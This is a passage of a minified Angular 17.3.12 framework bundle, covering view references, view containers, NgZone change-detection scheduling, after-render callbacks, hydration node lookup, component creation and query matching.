        (this.notifyErrorHandler = n),
        (this._appRef = null),
        (this._attachedToViewContainer = !1);
    }
    get context() {
      return this._lView[Qe];
    }
    set context(e) {
      this._lView[Qe] = e;
    }
    get destroyed() {
      return !(256 & ~this._lView[I]);
    }
    destroy() {
      if (this._appRef) this._appRef.detachView(this);
      else if (this._attachedToViewContainer) {
        let e = this._lView[fe];
        if (ft(e)) {
          let i = e[Uo],
            n = i ? i.indexOf(this) : -1;
          n > -1 && (_c(e, n), Vo(i, n));
        }
        this._attachedToViewContainer = !1;
      }
      bp(this._lView[k], this._lView);
    }
    onDestroy(e) {
      Sh(this._lView, e);
    }
    markForCheck() {
      Pl(this._cdRefInjectingView || this._lView);
    }
    detach() {
      this._lView[I] &= -129;
    }
    reattach() {
      lc(this._lView), (this._lView[I] |= 128);
    }
    detectChanges() {
      (this._lView[I] |= 1024), Zp(this._lView, this.notifyErrorHandler);
    }
    checkNoChanges() {}
    attachToViewContainerRef() {
      if (this._appRef) throw new D(902, !1);
      this._attachedToViewContainer = !0;
    }
    detachFromAppRef() {
      (this._appRef = null), Cp(this._lView[k], this._lView);
    }
    attachToAppRef(e) {
      if (this._attachedToViewContainer) throw new D(902, !1);
      (this._appRef = e), lc(this._lView);
    }
  },
  Le = (() => {
    let e = class e {};
    return (e.__NG_ELEMENT_ID__ = nw), e;
  })(),
  ew = Le,
  tw = class extends ew {
    constructor(e, i, n) {
      super(),
        (this._declarationLView = e),
        (this._declarationTContainer = i),
        (this.elementRef = n);
    }
    get ssrId() {
      return this._declarationTContainer.tView?.ssrId || null;
    }
    createEmbeddedView(e, i) {
      return this.createEmbeddedViewImpl(e, i);
    }
    createEmbeddedViewImpl(e, i, n) {
      let r = $0(this._declarationLView, this._declarationTContainer, e, {
        embeddedViewInjector: i,
        dehydratedView: n,
      });
      return new hn(r);
    }
  };
function nw() {
  return Sl(Ve(), X());
}
function Sl(t, e) {
  return 4 & t.type ? new tw(e, t, ii(t, e)) : null;
}
function Jp(t) {
  let e = t[ji] ?? [],
    n = t[fe][ne];
  for (let r of e) iw(r, n);
  t[ji] = Ie;
}
function iw(t, e) {
  let i = 0,
    n = t.firstChild;
  if (n) {
    let r = t.data[qo];
    for (; i < r; ) {
      let o = n.nextSibling;
      Dl(e, n, !1), (n = o), i++;
    }
  }
}
function eg(t) {
  Jp(t);
  for (let e = Ee; e < t.length; e++) Ko(t[e]);
}
function rw(t) {
  let e = t[Ze]?.i18nNodes;
  if (e) {
    let i = t[ne];
    for (let n of e.values()) Dl(i, n, !1);
    t[Ze].i18nNodes = void 0;
  }
}
function Ko(t) {
  rw(t);
  let e = t[k];
  for (let i = Se; i < e.bindingStartIndex; i++)
    if (ft(t[i])) {
      eg(t[i]);
    } else Ct(t[i]) && Ko(t[i]);
}
function ow(t) {
  let e = t._views;
  for (let i of e) {
    let n = RC(i);
    if (null !== n && null !== n[Pe])
      if (Ct(n)) Ko(n);
      else {
        Ko(n[Pe]), eg(n);
      }
  }
}
var sw = new RegExp(`^(\\d+)*(${lp}|${cp})*(.*)`);
function aw(t) {
  let e = t.match(sw),
    [i, n, r, o] = e,
    s = n ? parseInt(n, 10) : r,
    a = [];
  for (let [c, l, u] of o.matchAll(/(f|n)(\d*)/g)) {
    let d = parseInt(u, 10) || 1;
    a.push(l, d);
  }
  return [s, ...a];
}
function cw(t) {
  return !t.prev && 8 === t.parent?.type;
}
function Za(t) {
  return t.index - Se;
}
function lw(t, e) {
  let i = t.i18nNodes;
  if (i) {
    let n = i.get(e);
    return n && i.delete(e), n;
  }
  return null;
}
function Ms(t, e, i, n) {
  let r = Za(n),
    o = lw(t, r);
  if (!o) {
    let s = t.data[OC];
    if (s?.[r]) o = dw(s[r], i);
    else if (e.firstChild === n) o = t.firstChild;
    else {
      let a = null === n.prev,
        c = n.prev ?? n.parent;
      if (cw(n)) {
        o = vc(t, Za(n.parent));
      } else {
        let l = Te(c, i);
        if (a) o = l.firstChild;
        else {
          let u = Za(c),
            d = vc(t, u);
          if (2 === c.type && d) {
            o = Ds(vl(t, u) + 1, d);
          } else o = l.nextSibling;
        }
      }
    }
  }
  return o;
}
function Ds(t, e) {
  let i = e;
  for (let n = 0; n < t; n++) i = i.nextSibling;
  return i;
}
function uw(t, e) {
  let i = t;
  for (let n = 0; n < e.length; n += 2) {
    let r = e[n],
      o = e[n + 1];
    for (let s = 0; s < o; s++)
      switch (r) {
        case mc.FirstChild:
          i = i.firstChild;
          break;
        case mc.NextSibling:
          i = i.nextSibling;
      }
  }
  return i;
}
function dw(t, e) {
  let r,
    [i, ...n] = aw(t);
  if (i === cp) r = e[Fe][Pe];
  else if (i === lp) r = qC(e[Fe][Pe]);
  else {
    r = Xe(e[Number(i) + Se]);
  }
  return uw(r, n);
}
function fw(t, e) {
  let i = [];
  for (let n of e)
    for (let r = 0; r < (n[up] ?? 1); r++) {
      let o = { data: n, firstChild: null };
      n[qo] > 0 && ((o.firstChild = t), (t = Ds(n[qo], t))), i.push(o);
    }
  return [t, i];
}
var tg = () => null;
function hw(t, e) {
  let i = t[ji];
  return e && null !== i && 0 !== i.length
    ? i[0].data[EC] === e
      ? i.shift()
      : (Jp(t), null)
    : null;
}
function pw() {
  tg = hw;
}
function Tf(t, e) {
  return tg(t, e);
}
var Xo = class {},
  Mc = class {},
  Jo = class {};
function gw(t) {
  let e = Error(`No component factory found for ${we(t)}.`);
  return (e[mw] = t), e;
}
var mw = "ngComponent",
  Dc = class {
    resolveComponentFactory(e) {
      throw gw(e);
    }
  },
  Ht = (() => {
    let e = class e {};
    return (e.NULL = new Dc()), e;
  })(),
  $i = class {},
  xs = (() => {
    let e = class e {
      constructor() {
        this.destroyNode = null;
      }
    };
    return (e.__NG_ELEMENT_ID__ = () => vw()), e;
  })();
function vw() {
  let t = X(),
    i = $t(Ve().index, t);
  return (Ct(i) ? i : t)[ne];
}
var _w = (() => {
    let e = class e {};
    return (
      (e.ɵprov = y({ token: e, providedIn: "root", factory: () => null })), e
    );
  })(),
  Qa = {},
  Af = new Set();
function si(t) {
  Af.has(t) ||
    (Af.add(t),
    performance?.mark?.("mark_feature_usage", { detail: { feature: t } }));
}
function Rf(...t) {}
function yw() {
  let t = "function" == typeof Ce.requestAnimationFrame,
    e = Ce[t ? "requestAnimationFrame" : "setTimeout"],
    i = Ce[t ? "cancelAnimationFrame" : "clearTimeout"];
  if (typeof Zone < "u" && e && i) {
    let n = e[Zone.__symbol__("OriginalDelegate")];
    n && (e = n);
    let r = i[Zone.__symbol__("OriginalDelegate")];
    r && (i = r);
  }
  return { nativeRequestAnimationFrame: e, nativeCancelAnimationFrame: i };
}
var O = class t {
    constructor({
      enableLongStackTrace: e = !1,
      shouldCoalesceEventChangeDetection: i = !1,
      shouldCoalesceRunChangeDetection: n = !1,
    }) {
      if (
        ((this.hasPendingMacrotasks = !1),
        (this.hasPendingMicrotasks = !1),
        (this.isStable = !0),
        (this.onUnstable = new K(!1)),
        (this.onMicrotaskEmpty = new K(!1)),
        (this.onStable = new K(!1)),
        (this.onError = new K(!1)),
        typeof Zone > "u")
      )
        throw new D(908, !1);
      Zone.assertZonePatched();
      let r = this;
      (r._nesting = 0),
        (r._outer = r._inner = Zone.current),
        Zone.TaskTrackingZoneSpec &&
          (r._inner = r._inner.fork(new Zone.TaskTrackingZoneSpec())),
        e &&
          Zone.longStackTraceZoneSpec &&
          (r._inner = r._inner.fork(Zone.longStackTraceZoneSpec)),
        (r.shouldCoalesceEventChangeDetection = !n && i),
        (r.shouldCoalesceRunChangeDetection = n),
        (r.lastRequestAnimationFrameId = -1),
        (r.nativeRequestAnimationFrame = yw().nativeRequestAnimationFrame),
        bw(r);
    }
    static isInAngularZone() {
      return typeof Zone < "u" && !0 === Zone.current.get("isAngularZone");
    }
    static assertInAngularZone() {
      if (!t.isInAngularZone()) throw new D(909, !1);
    }
    static assertNotInAngularZone() {
      if (t.isInAngularZone()) throw new D(909, !1);
    }
    run(e, i, n) {
      return this._inner.run(e, i, n);
    }
    runTask(e, i, n, r) {
      let o = this._inner,
        s = o.scheduleEventTask("NgZoneEvent: " + r, e, Cw, Rf, Rf);
      try {
        return o.runTask(s, i, n);
      } finally {
        o.cancelTask(s);
      }
    }
    runGuarded(e, i, n) {
      return this._inner.runGuarded(e, i, n);
    }
    runOutsideAngular(e) {
      return this._outer.run(e);
    }
  },
  Cw = {};
function Tl(t) {
  if (0 == t._nesting && !t.hasPendingMicrotasks && !t.isStable)
    try {
      t._nesting++, t.onMicrotaskEmpty.emit(null);
    } finally {
      if ((t._nesting--, !t.hasPendingMicrotasks))
        try {
          t.runOutsideAngular(() => t.onStable.emit(null));
        } finally {
          t.isStable = !0;
        }
    }
}
function ww(t) {
  t.isCheckStableRunning ||
    -1 !== t.lastRequestAnimationFrameId ||
    ((t.lastRequestAnimationFrameId = t.nativeRequestAnimationFrame.call(
      Ce,
      () => {
        t.fakeTopEventTask ||
          (t.fakeTopEventTask = Zone.root.scheduleEventTask(
            "fakeTopEventTask",
            () => {
              (t.lastRequestAnimationFrameId = -1),
                xc(t),
                (t.isCheckStableRunning = !0),
                Tl(t),
                (t.isCheckStableRunning = !1);
            },
            void 0,
            () => {},
            () => {}
          )),
          t.fakeTopEventTask.invoke();
      }
    )),
    xc(t));
}
function bw(t) {
  let e = () => {
    ww(t);
  };
  t._inner = t._inner.fork({
    name: "angular",
    properties: { isAngularZone: !0 },
    onInvokeTask: (i, n, r, o, s, a) => {
      if (Mw(a)) return i.invokeTask(r, o, s, a);
      try {
        return Nf(t), i.invokeTask(r, o, s, a);
      } finally {
        ((t.shouldCoalesceEventChangeDetection && "eventTask" === o.type) ||
          t.shouldCoalesceRunChangeDetection) &&
          e(),
          kf(t);
      }
    },
    onInvoke: (i, n, r, o, s, a, c) => {
      try {
        return Nf(t), i.invoke(r, o, s, a, c);
      } finally {
        t.shouldCoalesceRunChangeDetection && e(), kf(t);
      }
    },
    onHasTask: (i, n, r, o) => {
      i.hasTask(r, o),
        n === r &&
          ("microTask" == o.change
            ? ((t._hasPendingMicrotasks = o.microTask), xc(t), Tl(t))
            : "macroTask" == o.change &&
              (t.hasPendingMacrotasks = o.macroTask));
    },
    onHandleError: (i, n, r, o) => (
      i.handleError(r, o), t.runOutsideAngular(() => t.onError.emit(o)), !1
    ),
  });
}
function xc(t) {
  t._hasPendingMicrotasks ||
  ((t.shouldCoalesceEventChangeDetection ||
    t.shouldCoalesceRunChangeDetection) &&
    -1 !== t.lastRequestAnimationFrameId)
    ? (t.hasPendingMicrotasks = !0)
    : (t.hasPendingMicrotasks = !1);
}
function Nf(t) {
  t._nesting++, t.isStable && ((t.isStable = !1), t.onUnstable.emit(null));
}
function kf(t) {
  t._nesting--, Tl(t);
}
var Ec = class {
  constructor() {
    (this.hasPendingMicrotasks = !1),
      (this.hasPendingMacrotasks = !1),
      (this.isStable = !0),
      (this.onUnstable = new K()),
      (this.onMicrotaskEmpty = new K()),
      (this.onStable = new K()),
      (this.onError = new K());
  }
  run(e, i, n) {
    return e.apply(i, n);
  }
  runGuarded(e, i, n) {
    return e.apply(i, n);
  }
  runOutsideAngular(e) {
    return e();
  }
  runTask(e, i, n, r) {
    return e.apply(i, n);
  }
};
function Mw(t) {
  return (
    !(!Array.isArray(t) || 1 !== t.length) &&
    !0 === t[0].data?.__ignore_ng_zone__
  );
}
function Dw(t = "zone.js", e) {
  return "noop" === t ? new Ec() : "zone.js" === t ? new O(e) : t;
}
var zn = (function (t) {
    return (
      (t[(t.EarlyRead = 0)] = "EarlyRead"),
      (t[(t.Write = 1)] = "Write"),
      (t[(t.MixedReadWrite = 2)] = "MixedReadWrite"),
      (t[(t.Read = 3)] = "Read"),
      t
    );
  })(zn || {}),
  xw = { destroy() {} };
function Es(t, e) {
  !e && my(Es);
  let i = e?.injector ?? v(re);
  if (!Si(i)) return xw;
  si("NgAfterNextRender");
  let n = i.get(Al),
    r = (n.handler ??= new Ic()),
    o = e?.phase ?? zn.MixedReadWrite,
    s = () => {
      r.unregister(c), a();
    },
    a = i.get(hl).onDestroy(s),
    c = dt(
      i,
      () =>
        new Oc(o, () => {
          s(), t();
        })
    );
  return r.register(c), { destroy: s };
}
var Oc = class {
    constructor(e, i) {
      (this.phase = e),
        (this.callbackFn = i),
        (this.zone = v(O)),
        (this.errorHandler = v(ut, { optional: !0 })),
        v(Xo, { optional: !0 })?.notify(1);
    }
    invoke() {
      try {
        this.zone.runOutsideAngular(this.callbackFn);
      } catch (e) {
        this.errorHandler?.handleError(e);
      }
    }
  },
  Ic = class {
    constructor() {
      (this.executingCallbacks = !1),
        (this.buckets = {
          [zn.EarlyRead]: new Set(),
          [zn.Write]: new Set(),
          [zn.MixedReadWrite]: new Set(),
          [zn.Read]: new Set(),
        }),
        (this.deferredCallbacks = new Set());
    }
    register(e) {
      (this.executingCallbacks
        ? this.deferredCallbacks
        : this.buckets[e.phase]
      ).add(e);
    }
    unregister(e) {
      this.buckets[e.phase].delete(e), this.deferredCallbacks.delete(e);
    }
    execute() {
      this.executingCallbacks = !0;
      for (let e of Object.values(this.buckets)) for (let i of e) i.invoke();
      this.executingCallbacks = !1;
      for (let e of this.deferredCallbacks) this.buckets[e.phase].add(e);
      this.deferredCallbacks.clear();
    }
    destroy() {
      for (let e of Object.values(this.buckets)) e.clear();
      this.deferredCallbacks.clear();
    }
  },
  Al = (() => {
    let e = class e {
      constructor() {
        (this.handler = null), (this.internalCallbacks = []);
      }
      execute() {
        this.executeInternalCallbacks(), this.handler?.execute();
      }
      executeInternalCallbacks() {
        let n = [...this.internalCallbacks];
        this.internalCallbacks.length = 0;
        for (let r of n) r();
      }
      ngOnDestroy() {
        this.handler?.destroy(),
          (this.handler = null),
          (this.internalCallbacks.length = 0);
      }
    };
    return (
      (e.ɵprov = y({ token: e, providedIn: "root", factory: () => new e() })), e
    );
  })();
function Pc(t, e, i) {
  let n = i ? t.styles : null,
    r = i ? t.classes : null,
    o = 0;
  if (null !== e)
    for (let s = 0; s < e.length; s++) {
      let a = e[s];
      if ("number" == typeof a) o = a;
      else if (1 == o) r = af(r, a);
      else if (2 == o) {
        n = af(n, a + ": " + e[++s] + ";");
      }
    }
  i ? (t.styles = n) : (t.stylesWithoutHost = n),
    i ? (t.classes = r) : (t.classesWithoutHost = r);
}
var es = class extends Ht {
  constructor(e) {
    super(), (this.ngModule = e);
  }
  resolveComponentFactory(e) {
    let i = Bt(e);
    return new Xn(i, this.ngModule);
  }
};
function Ff(t) {
  let e = [];
  for (let i in t) {
    if (!t.hasOwnProperty(i)) continue;
    let n = t[i];
    void 0 !== n &&
      e.push({ propName: Array.isArray(n) ? n[0] : n, templateName: i });
  }
  return e;
}
function Ew(t) {
  let e = t.toLowerCase();
  return "svg" === e ? by : "math" === e ? My : null;
}
var Sc = class {
    constructor(e, i) {
      (this.injector = e), (this.parentInjector = i);
    }
    get(e, i, n) {
      n = ls(n);
      let r = this.injector.get(e, Qa, n);
      return r !== Qa || i === Qa ? r : this.parentInjector.get(e, i, n);
    }
  },
  Xn = class extends Jo {
    get inputs() {
      let e = this.componentDef,
        i = e.inputTransforms,
        n = Ff(e.inputs);
      if (null !== i)
        for (let r of n)
          i.hasOwnProperty(r.propName) && (r.transform = i[r.propName]);
      return n;
    }
    get outputs() {
      return Ff(this.componentDef.outputs);
    }
    constructor(e, i) {
      super(),
        (this.componentDef = e),
        (this.ngModule = i),
        (this.componentType = e.type),
        (this.selector = ey(e.selectors)),
        (this.ngContentSelectors = e.ngContentSelectors
          ? e.ngContentSelectors
          : []),
        (this.isBoundToModule = !!i);
    }
    create(e, i, n, r) {
      let o = z(null);
      try {
        let s = (r = r || this.ngModule) instanceof Oe ? r : r?.injector;
        s &&
          null !== this.componentDef.getStandaloneInjector &&
          (s = this.componentDef.getStandaloneInjector(s) || s);
        let a = s ? new Sc(e, s) : e,
          c = a.get($i, null);
        if (null === c) throw new D(407, !1);
        let f = {
            rendererFactory: c,
            sanitizer: a.get(_w, null),
            inlineEffectRunner: null,
            afterRenderEventManager: a.get(Al, null),
            changeDetectionScheduler: a.get(Xo, null),
          },
          m = c.createRenderer(null, this.componentDef),
          w = this.componentDef.selectors[0][0] || "div",
          M = n
            ? m0(m, n, this.componentDef.encapsulation, a)
            : vs(m, w, Ew(w)),
          G = 512;
        this.componentDef.signals
          ? (G |= 4096)
          : this.componentDef.onPush || (G |= 16);
        let H = null;
        null !== M && (H = ml(M, a, !0));
        let _t,
          On,
          me = El(0, null, null, 1, 0, null, null, null, null, null, null),
          ve = Cs(null, me, null, G, null, null, f, m, a, null, H);
        sl(ve);
        try {
          let In,
            ze = this.componentDef,
            wa = null;
          ze.findHostDirectiveDefs
            ? ((In = []),
              (wa = new Map()),
              ze.findHostDirectiveDefs(ze, In, wa),
              In.push(ze))
            : (In = [ze]);
          let Lv = Iw(Ow(ve, M), M, ze, In, ve, f, m);
          (On = Ih(me, Se)),
            M && Tw(m, ze, M, n),
            void 0 !== i && Aw(On, this.ngContentSelectors, i),
            (_t = Sw(Lv, ze, In, wa, ve, [Rw])),
            Il(me, ve, null);
        } finally {
          al();
        }
        return new Tc(this.componentType, _t, ii(On, ve), ve, On);
      } finally {
        z(o);
      }
    }
  },
  Tc = class extends Mc {
    constructor(e, i, n, r, o) {
      super(),
        (this.location = n),
        (this._rootLView = r),
        (this._tNode = o),
        (this.previousInputValues = null),
        (this.instance = i),
        (this.hostView = this.changeDetectorRef = new hn(r, void 0, !1)),
        (this.componentType = e);
    }
    setInput(e, i) {
      let r,
        n = this._tNode.inputs;
      if (null !== n && (r = n[e])) {
        if (
          ((this.previousInputValues ??= new Map()),
          this.previousInputValues.has(e) &&
            Object.is(this.previousInputValues.get(e), i))
        )
          return;
        let o = this._rootLView;
        Ol(o[k], o, r, e, i),
          this.previousInputValues.set(e, i),
          Pl($t(this._tNode.index, o));
      }
    }
    get injector() {
      return new an(this._tNode, this._rootLView);
    }
    destroy() {
      this.hostView.destroy();
    }
    onDestroy(e) {
      this.hostView.onDestroy(e);
    }
  };
function Ow(t, e) {
  let i = t[k],
    n = Se;
  return (t[n] = e), ws(i, n, 2, "#host", null);
}
function Iw(t, e, i, n, r, o, s) {
  let a = r[k];
  Pw(n, t, e, s);
  let c = null;
  null !== e && (c = ml(e, r[Zn]));
  let l = o.rendererFactory.createRenderer(e, i),
    u = 16;
  i.signals ? (u = 4096) : i.onPush && (u = 64);
  let d = Cs(r, Fp(i), null, u, r[t.index], t, o, l, null, null, c);
  return (
    a.firstCreatePass && Cc(a, t, n.length - 1), bs(r, d), (r[t.index] = d)
  );
}
function Pw(t, e, i, n) {
  for (let r of t) e.mergedAttrs = Ni(e.mergedAttrs, r.hostAttrs);
  null !== e.mergedAttrs &&
    (Pc(e, e.mergedAttrs, !0), null !== i && Op(n, i, e));
}
function Sw(t, e, i, n, r, o) {
  let s = Ve(),
    a = r[k],
    c = Te(s, r);
  Bp(a, r, s, i, null, n);
  for (let u = 0; u < i.length; u++) {
    fn(Kn(r, a, s.directiveStart + u, s), r);
  }
  Up(a, r, s), c && fn(c, r);
  let l = Kn(r, a, s.directiveStart + s.componentOffset, s);
  if (((t[Qe] = r[Qe] = l), null !== o)) for (let u of o) u(l, e);
  return Rp(a, s, r), l;
}
function Tw(t, e, i, n) {
  if (n) ic(t, i, ["ng-version", "17.3.12"]);
  else {
    let { attrs: r, classes: o } = ty(e.selectors[0]);
    r && ic(t, i, r), o && o.length > 0 && Ep(t, i, o.join(" "));
  }
}
function Aw(t, e, i) {
  let n = (t.projection = []);
  for (let r = 0; r < e.length; r++) {
    let o = i[r];
    n.push(null != o ? Array.from(o) : null);
  }
}
function Rw() {
  let t = Ve();
  ul(X()[k], t);
}
var Ue = (() => {
  let e = class e {};
  return (e.__NG_ELEMENT_ID__ = Nw), e;
})();
function Nw() {
  return ig(Ve(), X());
}
var kw = Ue,
  ng = class extends kw {
    constructor(e, i, n) {
      super(),
        (this._lContainer = e),
        (this._hostTNode = i),
        (this._hostLView = n);
    }
    get element() {
      return ii(this._hostTNode, this._hostLView);
    }
    get injector() {
      return new an(this._hostTNode, this._hostLView);
    }
    get parentInjector() {
      let e = dl(this._hostTNode, this._hostLView);
      if (Hh(e)) {
        let i = zo(e, this._hostLView),
          n = Ho(e),
          r = i[k].data[n + 8];
        return new an(r, i);
      }
      return new an(null, this._hostLView);
    }
    clear() {
      for (; this.length > 0; ) this.remove(this.length - 1);
    }
    get(e) {
      let i = Lf(this._lContainer);
      return (null !== i && i[e]) || null;
    }
    get length() {
      return this._lContainer.length - Ee;
    }
    createEmbeddedView(e, i, n) {
      let r, o;
      "number" == typeof n
        ? (r = n)
        : null != n && ((r = n.index), (o = n.injector));
      let s = Tf(this._lContainer, e.ssrId),
        a = e.createEmbeddedViewImpl(i || {}, o, s);
      return this.insertImpl(a, r, Sf(this._hostTNode, s)), a;
    }
    createComponent(e, i, n, r, o) {
      let a,
        s = e && !_y(e);
      if (s) a = i;
      else {
        let w = i || {};
        (a = w.index),
          (n = w.injector),
          (r = w.projectableNodes),
          (o = w.environmentInjector || w.ngModuleRef);
      }
      let c = s ? e : new Xn(Bt(e)),
        l = n || this.parentInjector;
      if (!o && null == c.ngModule) {
        let M = (s ? l : this.parentInjector).get(Oe, null);
        M && (o = M);
      }
      let u = Bt(c.componentType ?? {}),
        d = Tf(this._lContainer, u?.id ?? null),
        f = d?.firstChild ?? null,
        m = c.create(l, r, f, o);
      return this.insertImpl(m.hostView, a, Sf(this._hostTNode, d)), m;
    }
    insert(e, i) {
      return this.insertImpl(e, i, !0);
    }
    insertImpl(e, i, n) {
      let r = e._lView;
      if (Iy(r)) {
        let a = this.indexOf(e);
        if (-1 !== a) this.detach(a);
        else {
          let c = r[fe],
            l = new ng(c, c[Je], c[fe]);
          l.detach(l.indexOf(e));
        }
      }
      let o = this._adjustIndex(i),
        s = this._lContainer;
      return H0(s, r, o, n), e.attachToViewContainerRef(), rh(Ka(s), o, e), e;
    }
    move(e, i) {
      return this.insert(e, i);
    }
    indexOf(e) {
      let i = Lf(this._lContainer);
      return null !== i ? i.indexOf(e) : -1;
    }
    remove(e) {
      let i = this._adjustIndex(e, -1),
        n = _c(this._lContainer, i);
      n && (Vo(Ka(this._lContainer), i), bp(n[k], n));
    }
    detach(e) {
      let i = this._adjustIndex(e, -1),
        n = _c(this._lContainer, i);
      return n && null != Vo(Ka(this._lContainer), i) ? new hn(n) : null;
    }
    _adjustIndex(e, i = 0) {
      return e ?? this.length + i;
    }
  };
function Lf(t) {
  return t[Uo];
}
function Ka(t) {
  return t[Uo] || (t[Uo] = []);
}
function ig(t, e) {
  let i,
    n = e[t.index];
  return (
    ft(n) ? (i = n) : ((i = $p(n, e, null, t)), (e[t.index] = i), bs(e, i)),
    rg(i, e, t, n),
    new ng(i, t, e)
  );
}
function Fw(t, e) {
  let i = t[ne],
    n = i.createComment(""),
    r = Te(e, t);
  return Zo(i, bl(i, r), n, o0(i, r), !1), n;
}
var rg = og,
  Rl = () => !1;
function Lw(t, e, i) {
  return Rl(t, e, i);
}
function og(t, e, i, n) {
  if (t[bt]) return;
  let r;
  (r = 8 & i.type ? Xe(n) : Fw(e, i)), (t[bt] = r);
}
function jw(t, e, i) {
  if (t[bt] && t[ji]) return !0;
  let n = i[Ze],
    r = e.index - Se;
  if (!n || mC(e) || gs(n, r)) return !1;
  let s = vc(n, r),
    a = n.data[gl]?.[r],
    [c, l] = fw(s, a);
  return (t[bt] = c), (t[ji] = l), !0;
}
function Vw(t, e, i, n) {
  Rl(t, i, e) || og(t, e, i, n);
}
function Bw() {
  (rg = Vw), (Rl = jw);
}
var Ac = class t {
    constructor(e) {
      (this.queryList = e), (this.matches = null);
    }
    clone() {
      return new t(this.queryList);
    }
    setDirty() {
      this.queryList.setDirty();
    }
  },
  Rc = class t {
    constructor(e = []) {
      this.queries = e;
    }
    createEmbeddedView(e) {
      let i = e.queries;
      if (null !== i) {
        let n = null !== e.contentQueries ? e.contentQueries[0] : i.length,
          r = [];
        for (let o = 0; o < n; o++) {
          let s = i.getByIndex(o),
            a = this.queries[s.indexInDeclarationView];
          r.push(a.clone());
        }
        return new t(r);
      }
      return null;
    }
    insertView(e) {
      this.dirtyQueriesWithMatches(e);
    }
    detachView(e) {
      this.dirtyQueriesWithMatches(e);
    }
    finishViewCreation(e) {
      this.dirtyQueriesWithMatches(e);
    }
    dirtyQueriesWithMatches(e) {
      for (let i = 0; i < this.queries.length; i++)
        null !== Nl(e, i).matches && this.queries[i].setDirty();
    }
  },
  Nc = class {
    constructor(e, i, n = null) {
      (this.flags = i),
        (this.read = n),
        (this.predicate = "string" == typeof e ? Yw(e) : e);
    }
  },
  kc = class t {
    constructor(e = []) {
      this.queries = e;
    }
    elementStart(e, i) {
      for (let n = 0; n < this.queries.length; n++)
        this.queries[n].elementStart(e, i);
    }
    elementEnd(e) {
      for (let i = 0; i < this.queries.length; i++)
        this.queries[i].elementEnd(e);
    }
    embeddedTView(e) {
      let i = null;
      for (let n = 0; n < this.length; n++) {
        let r = null !== i ? i.length : 0,
          o = this.getByIndex(n).embeddedTView(e, r);
        o &&
          ((o.indexInDeclarationView = n), null !== i ? i.push(o) : (i = [o]));
      }
      return null !== i ? new t(i) : null;
    }
    template(e, i) {
      for (let n = 0; n < this.queries.length; n++)
        this.queries[n].template(e, i);
    }
    getByIndex(e) {
      return this.queries[e];
    }
    get length() {
      return this.queries.length;
    }
    track(e) {
      this.queries.push(e);
    }
  },
  Fc = class t {
    constructor(e, i = -1) {
      (this.metadata = e),
        (this.matches = null),
        (this.indexInDeclarationView = -1),
        (this.crossesNgTemplate = !1),
        (this._appliesToNextNode = !0),
        (this._declarationNodeIndex = i);
    }
    elementStart(e, i) {
      this.isApplyingToNode(i) && this.matchTNode(e, i);
    }
    elementEnd(e) {
      this._declarationNodeIndex === e.index && (this._appliesToNextNode = !1);
    }
    template(e, i) {
      this.elementStart(e, i);
    }
    embeddedTView(e, i) {
      return this.isApplyingToNode(e)
        ? ((this.crossesNgTemplate = !0),
          this.addMatch(-e.index, i),
          new t(this.metadata))
        : null;
    }
    isApplyingToNode(e) {
      if (this._appliesToNextNode && 1 & ~this.metadata.flags) {
        let i = this._declarationNodeIndex,
          n = e.parent;
        for (; null !== n && 8 & n.type && n.index !== i; ) n = n.parent;
        return i === (null !== n ? n.index : -1);
      }
      return this._appliesToNextNode;
    }
    matchTNode(e, i) {
      let n = this.metadata.predicate;
      if (Array.isArray(n))
        for (let r = 0; r < n.length; r++) {
          let o = n[r];
          this.matchTNodeWithReadOption(e, i, Uw(i, o)),
            this.matchTNodeWithReadOption(e, i, No(i, e, o, !1, !1));
        }
      else
        n === Le
          ? 4 & i.type && this.matchTNodeWithReadOption(e, i, -1)
          : this.matchTNodeWithReadOption(e, i, No(i, e, n, !1, !1));
    }
    matchTNodeWithReadOption(e, i, n) {
      if (null !== n) {
        let r = this.metadata.read;
        if (null !== r)
          if (r === te || r === Ue || (r === Le && 4 & i.type))
            this.addMatch(i.index, -2);
          else {
            let o = No(i, e, r, !1, !1);
            null !== o && this.addMatch(i.index, o);
          }
        else this.addMatch(i.index, n);
      }
    }
    addMatch(e, i) {
      null === this.matches ? (this.matches = [e, i]) : this.matches.push(e, i);
    }
  };
function Uw(t, e) {
  let i = t.localNames;
  if (null !== i)
    for (let n = 0; n < i.length; n += 2) if (i[n] === e) return i[n + 1];
  return null;
}
function $w(t, e) {
  return 11 & t.type ? ii(t, e) : 4 & t.type ? Sl(t, e) : null;
}
function Hw(t, e, i, n) {
  return -1 === i ? $w(e, t) : -2 === i ? zw(t, e, n) : Kn(t, t[k], i, e);
}
function zw(t, e, i) {
  return i === te
    ? ii(e, t)
    : i === Le
    ? Sl(e, t)
    : i === Ue
    ? ig(e, t)
    : void 0;
}
function sg(t, e, i, n) {
  let r = e[wt].queries[n];
  if (null === r.matches) {
    let o = t.data,
      s = i.matches,
      a = [];
    for (let c = 0; null !== s && c < s.length; c += 2) {
      let l = s[c];
      if (l < 0) a.push(null);
      else {
        let u = o[l];
        a.push(Hw(e, u, s[c + 1], i.metadata.read));
      }
    }
    r.matches = a;
  }
  return r.matches;
}
function Lc(t, e, i, n) {
  let r = t.queries.getByIndex(i),
    o = r.matches;
  if (null !== o) {
    let s = sg(t, e, r, i);
    for (let a = 0; a < o.length; a += 2) {
      let c = o[a];
      if (c > 0) n.push(s[a / 2]);
      else {
        let l = o[a + 1],
          u = e[-c];
        for (let d = Ee; d < u.length; d++) {
          let f = u[d];
          f[Yi] === f[fe] && Lc(f[k], f, l, n);
        }
        if (null !== u[Qn]) {
          let d = u[Qn];
          for (let f = 0; f < d.length; f++) {
            let m = d[f];
            Lc(m[k], m, l, n);
          }
        }
      }
    }
  }
  return n;
}
function Ww(t, e) {
  return t[wt].queries[e].queryList;
}
function Gw(t, e, i) {
  let n = new Wo(!(4 & ~i));
  return (
    C0(t, e, n, n.destroy), (e[wt] ??= new Rc()).queries.push(new Ac(n)) - 1
  );
}
function qw(t, e, i) {
  let n = je();
  return (
    n.firstCreatePass &&
      (Zw(n, new Nc(t, e, i), -1), !(2 & ~e) && (n.staticViewQueries = !0)),
    Gw(n, X(), e)
  );
}
function Yw(t) {
  return t.split(",").map((e) => e.trim());
}
function Zw(t, e, i) {
  null === t.queries && (t.queries = new kc()), t.queries.track(new Fc(e, i));
}
function Nl(t, e) {
  return t.queries.getByIndex(e);
}
function Qw(t, e) {
  let i = t[k],
    n = Nl(i, e);
  return n.crossesNgTemplate ? Lc(i, t, e, []) : sg(i, t, n, e);
}
function Kw(t) {
  let e = [],
    i = new Map();
  function n(r) {
    let o = i.get(r);
    if (!o) {
      let s = t(r);
      i.set(r, (o = s.then(tb)));
    }
    return o;
